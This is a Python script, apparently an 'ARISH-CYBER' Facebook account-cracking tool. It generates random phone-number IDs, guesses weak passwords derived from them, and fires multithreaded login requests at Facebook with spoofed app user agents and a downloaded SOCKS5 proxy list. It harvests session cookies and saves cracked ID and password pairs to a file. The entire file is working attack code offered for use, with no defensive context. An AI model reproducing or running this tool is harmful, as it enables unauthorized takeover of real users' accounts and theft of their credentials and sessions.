#!/usr/bin/python3
import os,re,sys,random,string,time
from os import system as EHC
try:
    import requests
except:
    os.system("pip install requests")
    import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime 
from string import *
dateti=str(datetime.now()).split(" ")[0]
logo="""

 █████      █████     ████████ 
██   ██    ██   ██       ██    
███████    ███████       ██    
██   ██    ██   ██       ██    
██   ██ ██ ██   ██ ██    ██    
                               
                         
\033[37;1m-------------------------------------               
  \033[38;5;96m\033[47m A \x1b[0m\033[37;1m WORKING      FILE CLONE-NOT WORK
  \033[38;5;96m\033[47m R \x1b[0m\033[37;1m WORKING      RANDOM-WORKING✅
  \033[38;5;97m\033[47m I \x1b[0m\033[37;1m GITHUB       ARISH-CYBER-
  \033[38;5;98m\033[47m S\x1b[0m\033[37;1m COMMAND      \033[38;5;96m\033[47mPAID\x1b[0m
  \033[38;5;96m\033[47m H\x1b[0m\033[37;1m VERSION      \033[38;5;96m\033[47m0020EHC\x1b[0m
\033[1;97m-------------------------------------                                                                                                                                                      
"""
def line():
    print("—"*36)
def sykology():
    emran=[]
    EHC("clear")
    print(logo)
    print(" Example 018/017/019/016/015")
    ehc_code=input(" Choice [</] >")
    line()
    print(" Example 1000/2000/3000/4000")
    ehc_lim=int(input(" Choice [</] >"))
    line()
    for z in range(ehc_lim):
        co=''.join(random.choice(string.digits) for _ in range(8))
        emran.append(co)
    print(" [1] Server M      | [4] Server P")
    print(" [2] Server Mbasic | [5] Server X")
    print(" [3] Server Free   | [6] Server Touch")
    line()
    gxd=input(" [%$] Choice:")
    if gxd in ["1","M"]:
        fb="m"
        fb1="M1"
    elif gxd in ["2","Mbasic"]:
        fb="mbasic"
        fb1="M2"
    elif gxd in ["3","Free"]:
        fb="free"
        fb1="M3"
    elif gxd in ["4","P"]:
        fb="p"
        fb1="M4"
    elif gxd in ["5","X"]:
        fb="x"
        fb1="M5"
    else:
        fb="touch"
        fb1="M6"
    with ThreadPool(max_workers=100) as feel:
        EHC("clear")
        print(logo)
        tl=str(len(emran))
        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mArish-ok.txt") 
        print(f"    \033[38;5;46mCRACK ID\033[38;5;196m>> \033[38;5;49m{tl} \033[38;5;50m[{dateti}]") 
        line()
        for id in emran:
            uid=ehc_code+id
            pwx=[]
            pwx.append(uid[5:])#back 6
            pwx.append(uid[4:])#back 7
            pwx.append(uid[3:])#back 8
            pwx.append(uid[:6])#front 6
            pwx.append(uid[:7])#front 7
            pwx.append(uid[:8])#front 8
            pwx.append(uid)
            feel.submit(random_subb,uid,pwx,fb,fb1)
oks=[]
cps=[]
ugen=[]
loop=0

try:
    proxx=requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
except:
    print(" [✓] INTERNET CONNECTION ERROR")
    sys.exit()
open('.prox.txt','w').write(proxx)
pxx=open(".prox.txt","r").read().splitlines()

def sex():
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	fbrv = str(random.randint(000000000,999999999))
	density = random.choice(['2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/MTN-CG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]"
	return ua

def random_subb(uid,pwx,fb,fb1):
    global oks,cps,ugen,loop
    sys.stdout.write(f"\r\033[38;5;46m[ARISH-CYBER-OK]] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in pwx:
            free_fb = session.get(f'https://{fb}.facebook.com').text
            uuu=random.choice(proxx)
            info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            update= {"authority": f'{fb}.facebook.com',"method": 'POST',"scheme": 'https',"accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',"accept-encoding": 'gzip, deflate, br',"accept-language": 'en-US,en;q=1',"cache-control": 'no-cache, no-store, must-revalidate',"referer": f'https://{fb}.facebook.com/',"sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',"sec-ch-ua-mobile": '?0',"sec-ch-ua-platform": "Windows","sec-fetch-dest": 'document',"sec-fetch-mode": 'navigate',"sec-fetch-site": 'same-origin',"sec-fetch-user": '?1',"pragma": 'no-cache',"priority": 'u=1',"cross-origin-resource-policy": 'cross-origin',"upgrade-insecure-requests": '1',"user-agent": sex(),}
            session.post(url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update).text
            eehhcc=session.cookies.get_dict().keys()
            if "c_user" in eehhcc:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                sort=coki.split("sb=")[1]
                coki1=coki.split("1000")[1]
                xd="1000"+coki1[0:11]
                print(f"\r\r\033[38;5;46m[ARISH-CYBER-OK] \033[38;5;47m{xd} | {ps}  \n\033[38;5;46m[COOKIES] \033[38;5;49msb={sort}\n\033[38;5;48m———————————————————————————————————— ")
                open("/sdcard/Arish-ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        time.sleep(3)
sykology()



